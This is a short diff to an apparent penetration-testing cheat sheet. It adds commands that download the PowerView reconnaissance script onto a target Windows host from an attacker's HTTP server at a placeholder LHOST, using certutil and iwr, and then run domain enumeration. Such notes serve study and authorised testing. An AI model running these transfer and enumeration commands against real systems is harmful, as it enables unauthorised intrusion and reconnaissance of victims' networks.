@@ -84,6 +84,9 @@ net accounts
 
 ```powershell
 # PowerView (Kali: cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 .)
+# Pull it onto the target from your http server (python3 -m http.server 80):
+#   certutil.exe -urlcache -split -f "http://{{LHOST}}/PowerView.ps1" "C:\PowerView.ps1"
+#   iwr -Uri http://{{LHOST}}/PowerView.ps1 -OutFile C:\PowerView.ps1
 Import-Module .\PowerView.ps1
 Get-DomainPolicy
 ```
